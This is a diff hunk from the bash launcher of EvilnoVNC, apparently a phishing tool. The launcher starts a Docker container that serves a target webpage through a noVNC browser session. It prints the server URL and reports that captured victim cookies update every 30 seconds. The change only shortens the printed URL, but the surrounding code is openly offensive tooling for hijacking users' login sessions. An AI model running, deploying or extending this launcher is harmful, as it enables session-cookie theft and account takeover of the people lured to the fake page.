@@ -38,7 +38,7 @@ if ! (( $(ps -ef | grep -v grep | grep docker | wc -l) > 0 )) ; then
 sudo service docker start > /dev/null 2>&1 ; sleep 3 ; fi ; fi
 docker run -d --rm -p 5980:5980 -v "${PWD}/Downloads":"/home/user/Downloads" -e RESOLUTION=$RESOLUTION -e WEBPAGE=$WEBPAGE --name evilnovnc joelgmsec/evilnovnc > /dev/null 2>&1
 printf "\n\e[1;33m[>] EvilnoVNC Server is running.." ; sleep 3
-printf "\n\e[1;34m[+] URL: http://localhost:5980/index.html?autoconnect=true&password=false" ; sleep 3
+printf "\n\e[1;34m[+] URL: http://localhost:5980" ; sleep 3
 printf "\n\e[1;31m[!] Press Ctrl+C at any time to close!" ; sleep 3
 printf "\n\e[1;32m[+] Cookies will updated every 30 seconds.. \e[1;31m"
 
